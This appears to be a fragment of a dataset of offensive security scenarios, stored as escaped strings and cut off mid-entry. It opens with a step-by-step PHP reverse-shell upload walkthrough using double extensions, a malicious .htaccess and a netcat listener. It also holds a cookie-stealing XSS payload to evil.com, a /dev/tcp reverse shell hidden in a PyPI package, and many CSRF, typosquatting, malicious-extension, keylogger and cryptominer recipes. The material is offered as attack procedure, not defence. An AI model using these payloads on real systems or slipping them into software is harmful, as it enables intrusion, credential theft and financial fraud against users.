\"uploads/\" . $_FILES[\"file\"][\"name\"])) {<br> echo \"Upload Success\";<br>} else {<br> echo \"Upload Failed\";<br>}<br>\ud83d\uded1 No file extension filter = vulnerable\u2705 Or some filters like:php<br>$filename = $_FILES['file']['name'];<br>if (preg_match('/\\.php$/i', $filename)) die(\"Blocked!\");<br>\ud83e\udde0 This regex only blocks .php at the end.#### \ud83d\udc1a Step 2: Prepare Web ShellDownload:wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.phpEdit it:- Set $ip = 'ATTACKER_IP'- Set $port = 4444Rename it to:shell.php.jpg \u2705#### \ud83d\udcbb Step 3: Upload with Double ExtensionGo to: http://localhost/upload.phpChoose file: shell.php.jpgUpload \u2705Uploaded to: http://localhost/uploads/shell.php.jpgIn many misconfigured servers (Apache):\u2705 It still runs because Apache may treat .php.jpg as executable PHP if mod_mime is enabled or .htaccess rewrites exist.#### \ud83e\uddea Alternative Trick: shell.php;.jpgUse Burp Suite to intercept and rename during upload:\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php;.jpg\"\\r\\n\u2705 Windows-based servers ignore everything after the ; and treat it as .php#### \ud83e\udde8 Step 4: Setup Netcat ListenerIn attacker terminal:bash<br>nc -lvp 4444<br>#### \ud83d\udca5 Step 5: Trigger ExecutionVisit: http://localhost/uploads/shell.php.jpg\u2705 Shell opens on your terminal:bash<br>connect to [victim IP] from [attacker IP]<br>whoami<br>ls -la<br>\u2705 You have remote access to the server---### \ud83c\udf0d Real-World Example- Company website allows resume uploads- PHP extension blocked (.php) but not .php.txt or .php.jpg- Attacker uploads shell.php.jpg- Due to misconfiguration, file executes- Attacker gets reverse shell access to server---### \u2757 Why This Happens- Extension checks are based on filename not MIME/content- Servers like Apache can still interpret .php.jpg as PHP- Double extensions or Windows filename tricks (;) can bypass checks---### \ud83d\udee0 Advanced Variants- Try: shell.php.png, shell.php.phtml, shell.pHp, shell.phar, shell.php%00.jpg- Try uploading: shell.php but rename with %00 null byte if backend is written in C/C++ or old PHP---### \ud83d\udca1 Tips- Test upload response: Check Content-Type, response path- Try uploading with different tools: Burp, curl, Postman- Rename files dynamically during interception---", " \u2699\ufe0f Step 1: Setup a Vulnerable Upload PageUse DVWA or create your own upload form in upload.php:php<br>if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"uploads/\" . $_FILES[\"file\"][\"name\"])) {<br> echo \"Upload success!\";<br>} else {<br> echo \"Upload failed!\";<br>}<br>\ud83d\uded1 This

\ud83d\udc1a Step 3: Prepare a Web Shell (Fake Extension)Download:wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.phpRename it to shell.jpg and edit IP/port:- $ip = 'YOUR_ATTACKER_IP';- $port = 4444;\u2705 This is a PHP shell disguised as an image.#### \u2699\ufe0f Step 4: Create Malicious .htaccess FileContents:.htaccess<br>AddType application/x-httpd-php .jpg<br>AddHandler application/x-httpd-php .jpg<br>This forces Apache to treat .jpg files as PHP files \ud83d\ude08#### \ud83d\udce4 Step 5: Upload Both Files- Upload

The tag attempts to fetch and render the object, triggering the URL in the background. 3. If the victim is logged into mail.com, the request is sent with their cookies. 4. The target server deletes all emails or data without prompting the user. 5. Since <object> tags are often used for embedding, they attract little suspicion. 6. The action occurs in the background, with no visual indication. 7. Many sites still process GET requests that modify data, making them vulnerable. 8. This demonstrates how even legacy HTML elements can enable CSRF.", "1. An attacker creates a new JavaScript utility library and publishes it on npm, e.g., simple-log-enhancer.2. The package looks harmless and helpful; it improves logging formats and is adopted by smaller projects.3. However, it contains a postinstall hook in the package.json.4. This hook runs a script during installation which silently downloads and executes a remote file.5. The remote script can open reverse shells, modify env variables, or fetch next-stage payloads.6. Since postinstall scripts are commonly used, the malicious behavior is overlooked.7. Many users are compromised upon installation before any usage happens.", "1. An attacker creates an Android app that opens a hidden WebView pointing to https://secure.com/pay?to=attacker. 2. When the app runs, the WebView inherits the browser\u2019s session cookies. 3. The GET or POST request executes immediately within WebView using the victim\u2019s credentials. 4. The user is unaware that the WebView exists. 5. It can also run auto-submitting forms in JS inside WebView. 6. If the app is disguised as a utility tool or game, it is often installed willingly. 7. Since WebViews are full browsers, they execute CSRF like desktop ones. 8. Detection is hard unless server logs include user agents and suspicious IPs.", "1. An attacker deletes .github/workflows/security-checks.yml, which contains a key security validation step.2. This is done via a direct commit to the main branch.3. No alert is triggered for file deletion.4. Subsequent CI builds skip security checks, allowing malicious code to pass through.5. The incident is discovered after runtime compromise.6. Audit logs show the deletion, but no proactive alert was configured.", "1. An attacker discovers that an online calendar service has a GET endpoint to delete events via https://calendar.com/delete?id=1234. 2. They host a malicious page containing: <audio src=\"https://calendar.com/delete?id=1234\" autoplay hidden></audio>. 3. When a logged-in victim visits the attacker's page, the audio tag attempts to load the source URL. 4. The browser automatically sends the request using the victim's cookies, assuming it's just loading media. 5. The server processes the delete request without confirmation. 6. Since audio won\u2019t play and the tag is hidden, the user doesn\u2019t notice. 7. This method bypasses many traditional CSRF protections that look for form-based POSTs. 8. It exploits the fact that any media tag source can initiate a GET request.", "1. An attacker embeds <audio src=\"https://profile.com/removeFriend?id=123\" autoplay style=\"display:none;\"></audio> into their malicious page. 2. Once a logged-in victim visits the page, the browser tries to play the audio by downloading the remote file. 3. The GET request hits the target server with cookies intact. 4. If the server doesn\u2019t protect the endpoint, it performs the delete action. 5. Because no media is played or seen, the attack goes unnoticed. 6. It demonstrates how benign tags like <audio> can be hijacked to carry CSRF payloads. 7. Combined with style tricks, the attack becomes completely invisible to users. 8. Best practices should avoid using GET for anything destructive or session-altering.", "1. An attacker finds that a smart camera admin panel changes DNS settings via: GET /setDNS?ip=8.8.8.8. 2. They craft a phishing site with an image tag: <img src=\"http://192.168.0.10/setDNS?ip=attacker.com\">. 3. If the victim is connected to their home network and logged in, the image tag forces the DNS change. 4. This silently redirects all future traffic via the attacker's DNS server. 5. Since many IoT panels lack authentication after login, the change happens without prompts. 6. No CORS is triggered because it\u2019s a GET request with no response reading. 7. This kind of CSRF can hijack traffic and inject phishing or MITM content. 8. Attackers use public forums or phishing emails to distribute the exploit.", "1. An attacker forks a popular open-source repository using GitHub Actions.2. They modify a README file but also secretly inject a malicious curl command inside a script that runs on PR events.3. The project maintainers have CI workflows configured to run on pull_request events with write permissions.4. The malicious command executes and pulls a crypto-mining script hosted on Pastebin.5. GitHub-hosted runners execute the script for hours before it is noticed, consuming GitHub\u2019s compute budget.6. Other contributors begin to see elevated costs and reduced CI performance.7. Maintainers audit workflows and realize the on: pull_request events should not have write permissions.8. CI policies are updated, PR triggers are sandboxed, and GitHub tokens for workflows are downgraded to read-only.", "1. An attacker forks a public repo and inserts a keylogger inside a modified setup.py script.2. This script uses the pynput module to track keystrokes.3. The attacker opens a PR that triggers GitHub Actions via pull_request_target event.4. During the job run, the GitHub-hosted runner installs dependencies and silently runs the injected script.5. All keystrokes entered by the job\u2019s shell, including secret prompts and tokens, are logged to a local file.6. A follow-up command inside the script base64-encodes and uploads the log file to an external HTTP endpoint.7. The attacker periodically scrapes the endpoint and collects the keylog dumps.8. The SOC team later notices suspicious shell interaction times and external traffic to non-whitelisted domains during CI jobs.", "1. An attacker hosts a malicious webpage that includes inline JavaScript. 2. The script uses var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://wallet.com/send\", true); and sends preset values. 3. The request includes withCredentials=true, ensuring cookies are included. 4. Once the victim loads the page while logged in, the action is executed silently. 5. The wallet sends money to the attacker without the user clicking anything. 6. The browser does not display alerts or prompt the user. 7. This classic CSRF uses built-in browser trust in JS APIs. 8. Many older services do not validate the origin header, making this attack effective.", "1. An attacker identifies a site using https://api.site.com/getUser?callback=myFunc for JSONP requests. 2. They create a page that embeds a script tag: <script src=\"https://api.site.com/getUser?callback=evilFunc\"></script>. 3. When a logged-in user visits the attack page, their session cookie is attached to the request. 4. The attacker defines a malicious evilFunc() in JS to hijack the returned data. 5. The browser treats it as a valid script, executing the attacker's callback. 6. Sensitive information like profile or payment info is exfiltrated. 7. Because JSONP is cross-domain by design, it allows exploitation from attacker sites. 8. JSONP endpoints should never return sensitive data or accept arbitrary callbacks.", "1. An attacker identifies a version-specific memory flaw in Edge\u2019s WASM engine related to how memory is zero-initialized. 2. They construct a .wasm module that abuses this flaw by rapidly allocating memory and filling it with crafted data. 3. JS code initializes multiple WASM instances that interact with vulnerable structures. 4. When the browser tries to optimize memory access, it miscalculates offset boundaries. 5. This causes memory corruption, which is used to leak pointers or trigger further exploit stages. 6. The chain is effective only in affected versions of Edge. 7. WASM heap spraying makes the exploit more reliable by shaping memory layout predictably. 8. Such targeted attacks are seen in nation-state and APT operations.", "1. An attacker initiates a password reset on behalf of a target victim. 2. The reset link points to a page like reset.html?msg=Your%20reset%20is%20ready. 3. The attacker injects a payload into the msg parameter: <script>fetch('https://evil.com?c='+document.cookie)</script>. 4. The application reflects this parameter back into the HTML without sanitization. 5. When the victim clicks the reset link, the script executes in their browser. 6. The attacker receives the user's cookies, including authentication session data. 7. With the session cookie, the attacker bypasses login entirely. 8. This attack is effective against users who regularly reset passwords and trust email links.", "1. An attacker or malicious insider modifies a team or user\u2019s permissions to grant themselves admin access.2. This is done via GitHub\u2019s role management in settings or via API.3. GitHub logs the permission change in the audit log, but without any alerting setup, the action remains unnoticed.4. With admin access, the user can delete repos, alter settings, or invite collaborators.5. The Blue Team only notices after changes to repositories or org billing show signs of tampering.", "1. An attacker posts a shortened link on social media like: http://malicious.com/delete. 2. That link redirects to https://site.com/deleteAccount?confirm=yes. 3. A logged-in user who clicks the link unknowingly triggers account deletion. 4. The action is processed because it uses a GET request with no confirmation prompt. 5. Since the user voluntarily clicked the link, no browser warning is shown. 6. Attackers exploit trust in social platforms to push such destructive links. 7. The attacker may use Bit.ly or other URL shorteners to obscure the real destination. 8. Without anti-CSRF validation, the server processes the action silently.", "1. An attacker publishes a seemingly useful GitHub-integrated app and tricks a developer into installing it.2. The app requests scopes like repo or read:org, gaining access to private data once the user authorizes it.3. GitHub audit logs record the installation, but unless monitored, the activity goes unnoticed.4. The app uses GitHub APIs to exfiltrate data or plant malicious issues/code.5. Incident is detected weeks later via anomaly analysis or third-party security tooling.", "1. An attacker sets up a malicious CSS rule like: @font-face { font-family: EvilFont; src: url(\"https://app.com/trigger?banUser=123\"); }. 2. When a victim visits the attack site, their browser attempts to download the font file. 3. The request goes to the target application and includes the victim\u2019s cookies. 4. If the GET request is not protected and performs a state change, it executes silently. 5. The font is not actually rendered since the attacker may assign it to an invisible element. 6. This abuse of @font-face demonstrates how unexpected vectors like CSS can be used for CSRF. 7. Security teams often overlook font-based GET requests during audits. 8. The risk is amplified on sites that use GET for admin or destructive operations.", "1. An attacker sets up a malicious HTML page that contains <video src=\"https://site.com/disableUser?id=123\" autoplay muted style=\"display:none;\"></video>. 2. When a logged-in victim visits the page, the browser attempts to load and play the video file. 3. The request to the video source URL is a regular GET, and since the user is authenticated, cookies are sent automatically. 4. If the server does not enforce CSRF protection and allows GET requests to modify state (e.g., disabling a user), the action succeeds. 5. There is no alert or visible indication to the user that an action was triggered. 6. This tactic abuses the fact that media tags like <video> can fetch remote content silently. 7. Attackers often hide the tag with CSS and autoplay muted to avoid user suspicion. 8. It's particularly effective on poorly designed APIs that don\u2019t validate methods or referrers.", "1. An attacker with elevated GitHub access uses the audit log export API to download the entire audit trail of an organization.2. The intent is to discover who accessed what, when \u2014 enabling further targeted attacks.3. No alerts are triggered as log export actions are not monitored.4. The attacker uses insights to target high-privilege users and high-value repos.5. Blue Team remains unaware unless queried manually.", "1. An e-commerce platform allows logged-in users to access their order history and shipping info through /api/orders/history. 2. The backend includes CORS headers like Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true, which is a critical misconfiguration. 3. The attacker builds a fake product review blog and embeds malicious JavaScript on the page. 4. When a victim (logged-in customer) visits this site, the JavaScript silently issues a cross-origin fetch() to the e-commerce API. 5. The browser sends cookies along with the request since it\u2019s a credentialed call. 6. The server responds with full order history, including item names, delivery addresses, and contact numbers. 7. The attacker\u2019s script reads this data and sends it to a remote server. 8. The victim is unaware, as no alert or visible action occurs. This can lead to blackmail, resale of personal info, or physical stalking.", "1. An e-commerce site uses an embedded iframe to load a payment provider. 2. After payment, the provider sends a postMessage back to the main page indicating success. 3. The host site listens for this message but fails to validate the origin. 4. The attacker embeds the store in their own page, replaces the payment iframe with a fake one, and sends a forged message stating \u201cPayment Completed.\u201d 5. The store accepts the message, marks the order as paid, and proceeds with shipping. 6. The attacker receives items for free by bypassing actual payment. 7. This logic can be automated to exploit thousands of transactions. 8. No server communication was compromised \u2014 only SOP misuse in client messaging.", "1.

It injects UI elements that look identical to Chrome\u2019s native download prompts. 3. When users visit specific file-sharing or email services, it overlays a \u201cClick to save\u201d button. 4. Clicking the button downloads a malicious .exe or .apk file. 5. Since the prompt looks native, users are more likely to trust it. 6. The malware is executed outside browser scope and persists.", "1. An extension masquerading as a \u201cvisual note-taker\u201d asks for the activeTab, tabs, and desktopCapture permissions. 2. When the user visits sensitive sites, the extension programmatically activates screenshot functionality using chrome.tabCapture.capture() or chrome.desktopCapture.chooseDesktopMedia(). 3. These APIs return a media stream which is then drawn onto a hidden canvas. 4. The canvas image is converted to base64 and transmitted to a remote attacker-controlled server. 5. The attacker accumulates screenshots from banking portals, OTP screens, crypto wallets, and other sensitive interfaces. 6. These images can be processed with OCR to extract details like balances, account numbers, or transaction data. 7. Since the extension appears to provide useful features, the user does not suspect foul play. 8. The entire attack is stealthy and persistent.", "1. An extension offers a \u201cvoice note\u201d feature and requests microphone permissions. 2. After install, it continuously records audio in browser background without alerting the user. 3. The audio is streamed to a cloud server, where speech-to-text APIs transcribe it. 4. This data can contain sensitive meetings, conversations, or passwords spoken aloud. 5. Since the extension operates inside the browser, it avoids OS-level recording alerts. 6. Users believe mic access is used only when actively recording \u2014 not passively. 7. Long-form conversations may be indexed and stored indefinitely. 8. All of this happens while the extension appears idle.", "1. An extension poses as a tab grouping utility and requests tabs and storage permissions. 2. It sets up a background script that uses chrome.tabs.query({}) to enumerate all active tabs. 3. Each tab\u2019s URL, title, and favicon is logged in real time. 4. The extension also injects a script into open tabs using chrome.scripting.executeScript(). 5. These scripts can monitor session variables, cookies (if accessible), and login statuses via page DOM. 6. Data is collected and sent periodically to the attacker for session tracking or phishing campaign targeting. 7. This also allows them to detect when a user is on specific pages (like \u201ccheckout\u201d or \u201cOTP\u201d) for timing attacks.", "1.

This injected script listens to all keystrokes using document.addEventListener('keydown'), and captures typed input regardless of the webpage. 4. When users log in to banking portals, Gmail, or any secure site, the extension silently captures their usernames and passwords. 5. Captured data is buffered and periodically exfiltrated to a remote C2 server using HTTPS POST requests. 6.

Over time, the attacker accumulates credentials to high-value accounts and may sell them or use them for fraud. 8. Users remain unaware until unauthorized access occurs.", "1. The attacker builds a browser extension mimicking MetaMask UI and branding. 2. Once installed, the extension asks for wallet seed phrase or private key. 3. It then displays a fake balance and transaction history, syncing only with attacker\u2019s backend. 4. When the user tries to send ETH or tokens, the extension reroutes the transaction to attacker-controlled addresses. 5. Real blockchain confirmations are mimicked using dummy data. 6. The extension also blocks access to legitimate MetaMask or Web3 providers to avoid detection. 7. User\u2019s entire wallet is drained while believing funds are being processed.", "1. The attacker builds a fake news site embedded with JavaScript that waits for tab inactivity using document.hidden. 2.

It includes a fake URL using Unicode or special characters (e.g., \u201cfaceb00k.com\u201d with double zeroes) in the address bar. 4. The form accepts username/password and submits to the attacker\u2019s server. 5. A fake login error is shown to avoid suspicion. 6. The attacker logs into the victim\u2019s real Facebook and performs actions such as sending malicious messages to friends.", "1. The attacker builds a fake online coding environment that mimics popular IDEs. 2. A WASM miner is hidden inside the core editor initialization code. 3. Once the user starts editing code or loading templates, WebAssembly modules are fetched and executed. 4. The miner runs using a Web Worker that processes math-heavy mining operations in the background. 5. The editor interface looks authentic, so users stay on the page for long periods. 6. Meanwhile, their CPU is silently used to generate crypto profits for the attacker. 7. Since coding tools require high CPU, spikes aren\u2019t seen as suspicious. 8. The attack demonstrates how WASM can hide in expected places to maximize dwell time.", "1. The attacker builds a form with hidden inputs that modify a victim\u2019s profile on https://profile.com. 2.

Since the victim is logged in, the browser includes session cookies. 5. The request appears legitimate to the server. 6. The form is visually hidden with CSS (display:none) so the user never sees it. 7. This type of CSRF works when the server fails to check referrer or CSRF tokens. 8. Attackers use this for silent account takeovers or phishing pivots.", "1. The attacker builds a page with an HTML form targeting https://site.com/updateProfile. 2. Inputs like email=new@mail.com, name=attacker are pre-filled. 3. The page body includes onload=\"document.forms[0].submit()\" so the form submits immediately when the page loads. 4. A logged-in victim visiting this page causes their profile to be silently modified. 5. No JavaScript is visibly invoked, and the user sees no visual indicators. 6. This works due to the browser trusting cookie-based sessions. 7. No CSRF token means no validation or challenge happens. 8. The attack succeeds even if the user closes the tab quickly.", "1. The attacker builds a \u201cClipboard Optimizer\u201d Chrome extension claiming to enhance clipboard formatting. 2. It requests permissions for clipboardRead and clipboardWrite. 3. The extension uses document.execCommand('paste') or navigator.clipboard.readText() to monitor clipboard data. 4. When the user copies a cryptocurrency address (e.g., BTC, ETH), the extension detects the pattern via regex. 5. It replaces the clipboard content with an attacker-controlled address before the user pastes it. 6. The user unknowingly pastes the wrong address into a withdrawal form and sends funds to the attacker. 7. Since the address structure looks similar, users rarely notice the swap. 8. The extension performs this silently without UI changes.", "1. The attacker builds an extension with content_scripts targeting common websites. 2. When installed, the extension injects JavaScript into pages even if CSP headers block external scripts. 3. This is possible because extensions execute in a privileged context outside the page\u2019s CSP enforcement. 4. The script collects sensitive DOM data, like autofilled emails or addresses. 5. It also inserts new elements (e.g., phishing links or ads) into secure portals. 6. The malicious activity is concealed by mimicking native design and namespacing CSS. 7. All stolen data is sent silently to the attacker's backend over HTTPS. 8. Users and developers fail to notice since CSP audit tools don\u2019t track extension scripts.", "1. The attacker clones or modifies a crypto mining script that uses WASM for fast math operations (e.g., XMRig compiled to WASM). 2. The script checks if the current tab is not in focus using the document.hidden property. 3. When the user switches tabs, the miner activates quietly using requestAnimationFrame or setInterval. 4. It uses WebAssembly to run high-speed hash computations, consuming the user\u2019s CPU. 5. If the user returns to the tab, the mining activity stops instantly to avoid suspicion. 6. The CPU drain can go unnoticed for hours or days, especially on laptops or mobile devices. 7. The attacker receives steady cryptocurrency rewards from many affected users. 8. This abuse leverages the efficiency of WASM and browser event APIs to hide in plain sight.", "1. The attacker compiles malicious logic into a .wasm file and uploads it to a GitHub Pages-hosted project. 2. The WASM file appears to be part of a UI framework or utility. 3. Their main phishing or malware site includes this file via a <script> or fetch() call. 4. When the file is loaded, the embedded payload executes and begins malicious behavior (e.g., fingerprinting, beaconing, memory read). 5. Since it\u2019s hosted on GitHub, traffic appears legitimate and secure. 6. The file is rarely scanned, as .wasm is not a common extension for AV. 7. The attacker benefits from free hosting and HTTPS protection from GitHub. 8. This showcases how trusted CDNs can be abused for WASM malware delivery.", "1. The attacker convinces the user to install a bookmarklet promising functionality like \u201cdark mode\u201d or \u201cquick scan.\u201d 2. When the victim clicks it while logged into a secure site, it runs: fetch(\"https://secure.com/delete?target=123\", {credentials: \"include\"}). 3. The request executes in the background using the victim\u2019s cookies. 4. The action is completed instantly without any page reload. 5. Bookmarklets run in the context of the current page, enabling attacks on trusted domains. 6. Attackers share malicious bookmarklets disguised as productivity tools. 7. Since the user runs the code willingly, browser security does not block it. 8. This technique abuses the user\u2019s trust and session state.", "1. The attacker crafts a WASM module with linear memory exceeding the typical buffer (e.g., 64MB). 2. The module allocates structures that fill and overflow the memory buffer intentionally. 3. This is run inside a mobile-optimized web app or PWA, where memory protections are often weaker. 4. The JS glue code surrounding WASM suppresses errors using try/catch, hiding the overflow from the user. 5. If the browser doesn\u2019t enforce strict bounds checking, adjacent objects or function pointers may get overwritten. 6. This can result in crashes, memory leaks, or exploitation depending on the engine. 7. Mobile platforms often lag behind in WASM patching, making this more potent. 8. This attack is a known experimental technique in exploit dev circles.", "1. The attacker crafts an HTML email with a hidden <img> tag pointing to https://portal.com/disableNotifications. 2. The tag is styled as display:none or sized to 1x1 pixels to be invisible. 3. When the victim opens the email in their webmail (e.g., Gmail), the browser automatically loads the image. 4. Since most webmail clients use browser context and the victim is likely logged into the portal site, their session cookies are included in the request. 5. The action completes silently, disabling user notifications or preferences. 6. No script is needed \u2014 just passive HTML rendering. 7. This bypasses many traditional CSRF protections that only monitor form or JS usage. 8. It shows how emails can be weaponized for cross-origin GET-based CSRF.", "1. The attacker creates a .wasm module that dynamically allocates memory in a loop using memory.grow(). 2. The WASM memory is filled with a crafted pattern designed to overwrite neighboring memory objects. 3. The module is executed inside a loop in JavaScript that gradually increases buffer size. 4. At some threshold, the JS engine miscalculates the available space, leading to a potential overflow. 5. This may result in object corruption or execution flow redirection. 6. The attack is timed so the memory grows slowly to avoid triggering alarms. 7. Debugging and fuzzing are used to fine-tune memory offset hits. 8. This is an experimental but realistic method of exploring memory abuse using WASM.", "1. The attacker creates a Chrome extension branded as a PDF viewer or VPN tool. 2. Inside the extension\u2019s background script, they load a .wasm file compiled from a crypto miner. 3. The WASM module runs continuously even if the browser is minimized, consuming CPU. 4. The miner activates once per session or based on idle events to avoid immediate detection. 5. No permissions are requested beyond background and tabs, making the extension appear safe. 6. Chrome users see high CPU usage but may not associate it with the extension. 7. Thousands of installations mean the attacker profits significantly. 8. Google only removes the extension after user reports or review.", "1. The attacker creates a PWA or site with offline support using a ServiceWorker. 2. A .wasm miner is cached during initial visit. 3. When the user revisits or remains offline, the ServiceWorker loads and executes the WASM miner. 4. Since it's offline, no network activity gives away the attack. 5. Users may browse cached content while unknowingly mining crypto. 6. The miner continues until the user closes the browser or clears cache. 7. This technique is highly persistent due to offline storage and background nature of ServiceWorkers. 8. Few users inspect background scripts during offline access.", "1. The attacker creates a Python package called http-tools-lite and publishes it to PyPI, mimicking popular HTTP helper modules. 2. Inside the package\u2019s __init__.py, which runs automatically when the package is imported, the attacker inserts a line like os.system(\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"). 3. This reverse shell command opens a connection to the attacker\u2019s server and grants remote shell access to the system. 4. Any developer who installs and imports this package in their Python script unknowingly triggers the reverse shell execution. 5. The attacker now has full access to the environment, including any open files, secrets, SSH keys, or active containers. 6. The reverse shell persists as long as the script is running, enabling reconnaissance or lateral movement.", "1. The attacker creates a WASM miner using nested hash computation loops. 2. They embed it into a webpage without any throttling or sleep intervals. 3. When the user loads the page, the miner instantly begins heavy CPU usage. 4. The browser UI becomes unresponsive due to 100% core usage. 5. The page includes no visible elements, tricking users into staying while CPU cycles are burned. 6. Users may be forced to close the entire browser or reboot. 7. This denial-of-service variant is useful in targeted disruption campaigns. 8. It exploits the raw performance advantages of WASM.", "1. The attacker creates a fake form with a canvas overlay that appears transparent. 2. A WASM module is loaded that binds to the keyboard input listener. 3. Instead of using normal JavaScript keyloggers, input is parsed via compiled logic in WASM. 4. This allows the attacker to avoid standard browser protections or script auditing tools. 5. Captured input is rendered into the canvas in a hidden layer, then extracted via toDataURL() API. 6. The base64-encoded data is periodically sent to a remote server. 7. The attack is difficult to detect as it doesn\u2019t use classic JS-based logging. 8. WASM makes the keylogger nearly invisible to static inspection.", "1. The attacker creates a helper module used in build systems (e.g., build-styler), and publishes it with no malware initially.2. After some time, they update the module with a line of logic: if (Date.now() > X) executePayload().3. The payload does nothing harmful for weeks.4. After the set date, it silently executes actions like downloading a second-stage payload.5. By then, the package is adopted widely and no longer under scrutiny.6. The attacker gets access to many systems simultaneously when the payload triggers.7. Post-incident forensics show delayed activation via date logic.", "1. The attacker creates a large PNG/JPEG image that, when decoded using Canvas, allocates massive memory. 2. In parallel, a WASM module begins filling memory buffers with predictable patterns. 3. The image and WASM allocations together exhaust the browser\u2019s memory pool. 4. If the JS engine has faulty bounds-checking logic, this can lead to overflows. 5. The crafted WASM module tries to spray heap segments with specific markers. 6. Once the heap is in a predictable state, follow-up JavaScript attempts to exploit corrupted objects. 7. This combo of WASM + Canvas is difficult to detect, as both appear legitimate. 8. Successful exploitation could lead to memory disclosure or browser crashes.", "1. The attacker creates a legitimate-looking site such as a blog or news article to encourage users to keep it open. 2. A JavaScript function tracks user activity with the blur event (when tab loses focus) and uses setTimeout to wait for inactivity. 3. After a delay (e.g., 30 seconds), the script dynamically rewrites the page\u2019s document.body.innerHTML to display a perfect replica of the Gmail login page. 4. When the user returns to the tab and sees the login form, they assume they were logged out due to inactivity. 5. They re-enter their credentials, which are then captured by the attacker and sent to a malicious endpoint using fetch() or XMLHttpRequest. 6. The attacker displays a fake error like \u201cIncorrect password. Please try again\u201d to cover tracks. 7. Meanwhile, the attacker logs into the real Gmail account using the stolen credentials.", "1. The attacker creates a library called fastCompress.js claimed to be a compression tool. 2. Instead of actual compression code, the library contains a WASM loader that fetches and executes a hidden .wasm file. 3. The .wasm file is described as a \u201ccore compression engine.\u201d 4. The real purpose is fingerprinting and data exfiltration. 5. The library is published on open package repositories and used in multiple blogs or CMS themes. 6. Site admins unknowingly include it, thinking it\u2019s for faster performance. 7. When the site loads, the WASM payload runs without suspicion. 8. This supply chain-style deception abuses trust in utility packages.", "1. The attacker creates a malicious HTML page with an invisible <iframe> element pointing to a money transfer form on https://target.com. 2. Inside the iframe, a pre-filled form is auto-submitted using JavaScript (form.submit()). 3. Since the user is logged into the target site, the browser sends cookies with the request. 4. The action completes (e.g., money transferred, password changed) without user interaction. 5. The victim sees only a blank or unrelated page. 6. Multiple iframes can be used to trigger several parallel actions. 7. The attacker cycles iframe URLs with random delays to avoid detection. 8. Exploits the fact that browsers trust iframe POSTs from authenticated sessions.", "1. The attacker creates a multi-stage miner split across several .wasm modules. 2. Initial loader verifies system resources using JavaScript (e.g., cores, battery). 3. If conditions match (e.g., high CPU, plugged-in), next WASM module is fetched and instantiated. 4. Each stage adds new capabilities like parallelism, throttling, or anti-debugging. 5. The modules use dynamic imports or decryption to prevent full payload analysis in one go. 6. All stages run in memory and clean up after execution. 7. This layered approach complicates reverse engineering. 8. It enables adaptive mining across systems with different specs.", "1. The attacker creates a package named requessts with the same description and metadata as the real requests library. 2. Inside the __init__.py, the attacker adds a script to collect environment variables like AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY. 3. These are then base64 encoded and sent via a POST request to an attacker-controlled server. 4. The package is published on PyPI with keywords and descriptions that match legitimate libraries. 5. A developer accidentally installs requessts instead of requests and runs the build. 6. The malicious code executes on install via setup.py, stealing sensitive keys.", "1. The attacker creates a public Action named acme/build-check matching an internal one. 2. A new dev mistakenly references this public Action in workflow YAML. 3. The malicious Action executes shell commands to dump secrets, environment variables. 4. It uploads them to a remote server during CI. 5. The attacker scrapes GitHub Actions Marketplace for similar namespace opportunities.", "1. The attacker creates a shared linear memory buffer in WASM (e.g., 64MB). 2. They use JavaScript to create multiple typed array views over the same buffer. 3. These views are misused to write out-of-bounds values into adjacent memory. 4. The overlapping writes can lead to object corruption or browser instability. 5. A vulnerable browser JIT may incorrectly optimize this behavior, opening a window for exploitation. 6. The attacker may gain arbitrary read/write primitives. 7. This technique is experimental but has shown promise in bypassing sandbox restrictions. 8. It requires deep knowledge of engine internals but can lead to serious exploits.", "1. The attacker creates a site that includes a SharedWorker script running a WASM-based miner. 2. When a user opens the site in multiple tabs, the SharedWorker ensures the miner runs only once. 3. Each tab connects to the same mining session, reducing suspicion and avoiding performance spikes. 4. The miner continues running even if individual tabs are closed, until all are terminated. 5. This creates persistent background mining that adapts to tab behavior. 6. The miner throttles itself based on CPU usage to remain under detection thresholds. 7. The user is unaware as they continue browsing with multiple tabs open. 8. This technique maximizes efficiency of WASM miners across browsing sessions.", "1. The attacker creates a web-based mini-game (e.g., pong, puzzle) hosted on a popular blog widget platform. 2. Inside the game's logic, they load a small .wasm file that is compiled from a C module containing a network beacon routine. 3. The WASM module, once initialized, periodically sends encrypted pings to the attacker\u2019s C2 server. 4. These pings are disguised as score updates or analytics packets. 5. The game functions normally and serves as a distraction to the malicious communication. 6. Since the logic is inside WASM, static analysis tools looking at the HTML or JavaScript don\u2019t catch it. 7. The attacker receives silent updates whenever users load or interact with the widget. 8. This demonstrates WASM being abused for stealthy persistence and outbound traffic.", "1. The attacker creates a webpage with a survey or registration form. 2. A WASM module containing a miner is embedded, but doesn\u2019t activate on load. 3. JavaScript listens for the submit event from the form. 4. Once the user submits their information, the miner starts silently in the background. 5. Since the user willingly performed an action, CPU usage post-submission is less suspicious. 6. The miner is throttled to use only 30-40% of CPU, avoiding performance spikes. 7. Users often leave the confirmation page open, extending mining time. 8. This technique uses user trust and natural interactions to hide mining activity.", "1. The attacker creates an invisible iframe that loads a malicious form pointing to https://bank.com/transfer. 2. Inside the iframe, the form includes pre-filled values (e.g., recipient and amount) and a small JavaScript block: window.onload = function() { document.forms[0].submit(); }. 3. When a logged-in user visits the attacker\u2019s page, the iframe loads, and the form automatically submits. 4. The browser attaches the user's session cookie to the POST request. 5. The bank server receives what appears to be a legitimate money transfer from the logged-in user. 6. Since the iframe is hidden using style=\"display:none\", users don\u2019t see the transfer form. 7. This method bypasses user interaction checks by chaining HTML and JS. 8. If the target site lacks CSRF tokens or origin checks, this results in unauthorized transfers.", "1. The attacker creates git-token-helper, claiming to simplify GitHub CLI authentication. 2. In the postinstall script, they add code that opens the user\u2019s default browser to https://github-secure-login.com. 3. The phishing site mimics the GitHub OAuth flow and prompts users to authorize access. 4. When the victim logs in, the OAuth token is captured and stored on the attacker\u2019s backend. 5. These tokens allow full access to the victim\u2019s private repositories, organizations, or GitHub Actions settings. 6. The attack is highly successful as users think it's part of the tool setup process.", "1. The attacker embeds a <link rel=\"stylesheet\" href=\"https://api.site.com/lockAccount?user=123\">. 2. When the browser tries to apply the 